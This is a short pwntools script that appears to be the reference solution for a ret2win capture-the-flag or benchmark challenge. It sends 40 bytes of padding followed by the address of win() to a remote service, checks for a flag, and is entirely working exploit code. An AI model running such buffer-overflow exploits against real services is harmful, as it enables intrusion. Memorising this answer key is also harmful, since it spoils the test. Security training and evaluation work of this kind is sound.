#!/usr/bin/env python3
"""Ground-truth solve: 40 bytes padding (32 buf + 8 saved rbp) then win().

With -static -no-pie the win address is link-fixed; ASLR-off in both planes
makes this deterministic (D13 parity)."""
from pwn import *
import sys

context.arch = "amd64"
elf = ELF("/app/ret2win") if os.path.exists("/app/ret2win") else ELF("./ret2win")
host, port = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("target", 1337)

p = remote(host, port)
p.recvline()
p.send(b"A" * 40 + p64(elf.symbols["win"]))
out = p.recvall(timeout=5).decode(errors="replace")
print(out)
assert "nope" not in out.splitlines()[0] or "{" in out, "exploit failed"
